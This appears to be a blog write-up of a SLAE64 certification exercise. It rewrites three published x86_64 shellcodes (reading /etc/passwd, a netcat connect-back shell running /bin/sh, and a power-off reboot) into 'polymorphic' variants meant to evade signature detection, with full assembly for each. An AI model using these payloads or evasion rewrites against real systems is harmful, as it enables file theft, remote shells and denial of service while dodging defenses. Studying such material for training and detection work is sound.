title: Polymorphic Shellcode
date: 2018-05-19
published: true 
summary: My solution to SLAE64 Exam Question 6
tags: shellcode, exploit, assembly

#Polymorphic Shellcode

This is my solution to the sixth exam question of the SLAE64 certification. This exercise was to pick 3 shellcodes from [shell-storm](http://shell-storm.org/shellcode/) and create "polymorphic" versions of them to defeat pattern matching (theoretically antivirus or a snort rule or something along those lines). "Polymorphic" in this context was basically just used to indicate that the shellcode bytes should be very different than the original, or different instructions to do the same thing. I think a more accepted use of that term in computer science refers to functions which perform the same action on different object types, but I guess the word's usage here is *sort of* along the same lines.

The lone constraint was the polymorphic version could not be longer than 150% the original shellcode (with bonus points for decreasing the length).

There were quite a few Linux x86_64 options to choose from. I chose the following three:

* [Read /etc/passwd](http://shell-storm.org/shellcode/files/shellcode-878.php) (because i work with that guy) 

* [connect back shell with netcat](http://shell-storm.org/shellcode/files/shellcode-823.php) (because netcat is my second favorite cat behind the one on the home page of this website)

* [reboot(POWER_OFF)](http://shell-storm.org/shellcode/files/shellcode-602.php) (because i thought it would be fun to end this post by shutting down) 

###Read /etc/passwd:

Here is the original shellcode:

    BITS 64
    ; Author Mr.Un1k0d3r - RingZer0 Team
    ; Read /etc/passwd Linux x86_64 Shellcode
    ; Shellcode size 82 bytes
    global _start

    section .text

    _start:
    jmp _push_filename
      
    _readfile:
    ; syscall open file
    pop rdi ; pop path value
    ; NULL byte fix
    xor byte [rdi + 11], 0x41
      
    xor rax, rax
    add al, 2
    xor rsi, rsi ; set O_RDONLY flag
    syscall
      
    ; syscall read file
    sub sp, 0xfff
    lea rsi, [rsp]
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0xfff; size to read
    xor rax, rax
    syscall
      
    ; syscall write to stdout
    xor rdi, rdi
    add dil, 1 ; set stdout fd = 1
    mov rdx, rax
    xor rax, rax
    add al, 1
    syscall
      
    ; syscall exit
    xor rax, rax
    add al, 60
    syscall
      
    _push_filename:
    call _readfile
    path: db "/etc/passwdA"

I executed it with the same shellcode runner used in other exam solutions:

![etc passwd](/static/blog/2018/SLAE64/6/etc_passwd.png)

82 bytes - so we are limited to 82*1.5=123 bytes for our new version. Rather than write everything from scratch, I just reorganized the program where possible, and add some limited encoding such as `xor` some values with constants. I also substituted like instructions such as `push`ing and `pop`ing where possible rather than `mov`ing, `inc` instead of `add`ing 1, and stuff like that. This is my final result:

    BITS 64
    global _start
    section .text

    _start:
      xor r12,r12
      mov rbx, 0x2323232323475450
      push rbx
      mov rbx, 0x5042530c4057460c
      push rbx
      mov rdi,rsp

      ; syscall open file
      mov rbx, 0x2323232323232323
      xor [rdi], rbx
      xor dword [rdi + 8], 0x23232323
      mov rax, r12
      inc al
      inc al 
      mov rsi, r12 ; set O_RDONLY flag
      syscall
      
      ; syscall read file
      lea rsi, [rsp - 0xfff]
      mov rdi, rax
      mov rdx, r12 
      or dx, 0xfff; size to read
      mov rax, r12
      syscall
      
      ; syscall write to stdout
      mov rdi, r12
      inc dil; set stdout fd = 1
      mov rdx, rax
      mov rax, r12
      inc al 
      syscall
      
      ; crash
      jmp r12

Pretty much every instruction is different at this point, and I `xor` encoded any constants. I also removed the graceful exit, and just crash the program instead. It's a slight increase in length, but not too bad:

![poly etc](/static/blog/2018/SLAE64/6/poly_etc_passwd.png)

###Connect back shell with netcat

Here is the original shellcode:

    ; { Title: Shellcode linux/x86-64 connect back shell }

    ; Author    : Gaussillusion
    ; Len       : 109 bytes
    ; Language  : Nasm

    ;syscall: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)

    BITS 64
    xor     rdx,rdx
    mov     rdi,0x636e2f6e69622fff
    shr rdi,0x08
    push    rdi
    mov     rdi,rsp

    mov rcx,0x68732f6e69622fff
    shr rcx,0x08
    push    rcx
    mov rcx,rsp

    mov     rbx,0x652dffffffffffff
    shr rbx,0x30
    push    rbx
    mov rbx,rsp

    mov r10,0x37333331ffffffff
    shr     r10,0x20
    push    r10
    mov r10,rsp

    jmp short ip
    continue:
    pop     r9

    push    rdx  ;push NULL
    push    rcx  ;push address of 'bin/sh'
    push    rbx  ;push address of '-e'
    push    r10  ;push address of '1337'
    push    r9   ;push address of 'ip'
    push    rdi  ;push address of '/bin/nc'

    mov     rsi,rsp
    mov     al,59
    syscall


    ip:
        call  continue
        db "127.0.0.1"

It connects back, of course, on port `1337`. Note that you need to have the `nc-traditional` package rather than the `nc-openbsd` package for this payload to work. I executed it to make sure it worked:

![nc](/static/blog/2018/SLAE64/6/nc_revshell.png)

Now we have up to floor(109*1.5)=163 bytes to use. I followed the same strategy as before - encoding constants, changing registers, replacing instructions with different but equivalent ones and so on (for example, the first step was replacing all the `mov` and `shr` sequences). This is my final result:

    ;syscall: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)

    BITS 64
    xor     r11,r11
    push    r11
    mov     rdi,0x636e2f2f6e69622f
    push    rdi
    mov     rdi,rsp

    push    r11
    mov rbx,0x68732f2f6e69622f
    push    rbx
    mov rbx,rsp

    push    word 0x652d
    mov rcx,rsp

    push    dword 0x37333331
    mov r9,rsp

    push    r11
    mov r10, 0x30302e302e302e30     ;localhost cheat
    push    r10
    mov r10,rsp

    push    r11  ;push NULL - this stuff is same same but diff registers
    push    rbx  ;push address of '/bin//sh'
    push    rcx  ;push address of '-e'
    push    r9  ;push address of '1337'
    push    r10   ;push address of 'ip'
    push    rdi  ;push address of '/bin//nc'

    mov rdx,r11
    mov     rsi,rsp
    mov     al,59
    syscall

One other interesting thing is since I am connecting to localhost, I actually passed "00.0.0.0" to the IP argument to save bytes, it works just fine.

This time, we actually decreased the length, from 109 to 86 bytes:

![nc](/static/blog/2018/SLAE64/6/poly_nc_revshell.png)

###reboot(POWER_OFF)

Here is the original shellcode:

    section .text
    global _start

    _start:
      mov     edx, 0x4321fedc
      mov     esi, 0x28121969
      mov     edi, 0xfee1dead
      mov     al,  0xa9
      syscall

This shellcode was so short, essentially just one syscall, so modifying it to appear quite different in terms of instructions was quick. The original was 19 bytes, so we had up to 28 bytes to work with in the polymorphic version. I really just replaced the `mov` instructions with `push` and `pop`s. The other main alteration I made was discovering Linux allows different magic numbers to be passed as the second argument to the `reboot` syscall - very convenient for this assignment to add some extra transform (the numbers in hex are actually Linus' and his daughters' birthdays apparently (0x16041998 for example)). My final shellcode:

    BITS 64

    section .text
    global _start

    _start:
      push 0x4321fedc
      pop rdx
      push 0x16041998
      pop rsi
      push 0x11e2152
      pop rdi
      not edi
      push 0xa9
      pop rax
      syscall

Note that to run this you will need to be root or use `sudo` for the `reboot` syscall.

This shellcode is just within the problem requirements at exactly 28 bytes:

![poly reboot len](/static/blog/2018/SLAE64/6/poly_reboot_len.png)

And here's a screenshot to prove it worked ;):

![poly reboot](/static/blog/2018/SLAE64/6/poly_reboot.png)

#### Conclusion Note
One thing I wanted to note form this exercise is that it underscores how many different byte patterns may achieve the same functionality. This is true from assembly to scripting languages... detection is hard.

All code referenced in this blog post is available at: <https://github.com/mrT-F/SLAE64/tree/master/6>

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification* 

*Certification at: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>*

*Student ID: SLAE64 - 1546*